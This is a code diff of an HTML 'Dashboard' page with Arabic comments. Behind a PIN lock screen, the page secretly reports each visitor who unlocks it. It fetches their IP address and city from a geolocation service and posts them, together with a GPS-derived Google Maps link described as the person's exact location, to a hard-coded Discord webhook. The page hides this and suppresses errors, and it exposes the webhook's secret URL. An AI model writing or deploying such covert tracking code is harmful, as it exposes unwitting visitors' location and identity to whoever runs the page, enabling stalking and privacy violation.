@@ -3,22 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard Access</title>
+    <title>Dashboard</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: sans-serif; overflow: hidden; background: #f0f2f5; }
-        .login-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 280px; }
+        /* نظام الطبقات لضمان عدم ظهور الشاشة البيضاء */
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #f0f2f5; font-family: sans-serif; }
+        #lock-screen { position: absolute; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: #f0f2f5; z-index: 999; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 280px; text-align: center; }
         input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 18px; text-align: center; }
-        button { background: #4f46e5; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; cursor: pointer; font-weight: bold; font-size: 16px; }
-        #main-content { display: none; height: 100vh; width: 100vw; position: absolute; top: 0; left: 0; }
+        button { background: #4f46e5; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; cursor: pointer; font-weight: bold; }
+        #main-content { position: absolute; width: 100%; height: 100%; display: none; z-index: 1; }
         iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
 
-    <div id="lock-screen" class="login-box">
+    <div id="lock-screen">
         <div class="card">
-            <h2>🔐 دخول</h2>
+            <h2>🔐 دخول آمن</h2>
             <input type="password" id="passInput" placeholder="أدخل الكود">
             <button onclick="handleUnlock()">دخول</button>
             <p id="msg" style="color: red; font-size: 13px; margin-top: 10px;"></p>
@@ -30,44 +31,40 @@
     </div>
 
     <script>
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465111327482708105/rrFvR8ThqXCp28WtaopCTPj8BRRHUzwfd92IbiECYK3B1n4qwy5qiKhHGGVY-A3GhPdN";
+        const WEBHOOK = "https://discord.com/api/webhooks/1465111327482708105/rrFvR8ThqXCp28WtaopCTPj8BRRHUzwfd92IbiECYK3B1n4qwy5qiKhHGGVY-A3GhPdN";
 
-        // وظيفة الإرسال لـ Discord معزولة تماماً
-        function sendReport(gps = "غير متوفر") {
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    fetch(DISCORD_WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `🚨 **دخول جديد**\n📍 المدينة: ${data.city}\n🌐 IP: ${data.ip}\n🗺️ الموقع: ${gps}`
-                        })
-                    });
-                }).catch(e => console.log("Silent error"));
+        // وظيفة الإرسال الفوري لـ Discord
+        function notifyDiscord(message) {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: message })
+            }).catch(e => console.log("Silent skip"));
         }
 
-        function handleUnlock() {
+        async function handleUnlock() {
             const pin = document.getElementById('passInput').value;
             
             if (pin === "1234") {
-                // 1. الفتح الفوري للمحتوى (أهم خطوة لتفادي الشاشة البيضاء)
+                // 1. الفتح الفوري (إخفاء القفل وإظهار الجدول)
                 document.getElementById('lock-screen').style.display = 'none';
                 document.getElementById('main-content').style.display = 'block';
 
-                // 2. طلب الموقع وإرسال التقرير "في الخلفية"
-                // الكود كيكمل خدمتو حتى لو المستخدم ما وافقش على الـ GPS
+                // 2. إرسال تنبيه الدخول فوراً مع معلومات الـ IP
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
+                    notifyDiscord(`🚨 **دخول جديد!**\n📍 المدينة: ${data.city}\n🌐 IP: ${data.ip}`);
+                } catch (e) {
+                    notifyDiscord("🚨 دخول جديد (تعذر جلب الـ IP)");
+                }
+
+                // 3. طلب الـ GPS في الخلفية (بدون تأخير الواجهة)
                 if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                            sendReport(map);
-                        },
-                        () => { sendReport(); }, // في حالة الرفض
-                        { timeout: 4000 } // وقت انتظار قصير
-                    );
-                } else {
-                    sendReport();
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        notifyDiscord(`🗺️ **موقع الشخص الدقيق:** ${map}`);
+                    }, null, { timeout: 5000 });
                 }
             } else {
                 document.getElementById('msg').innerText = "الكود غير صحيح!";
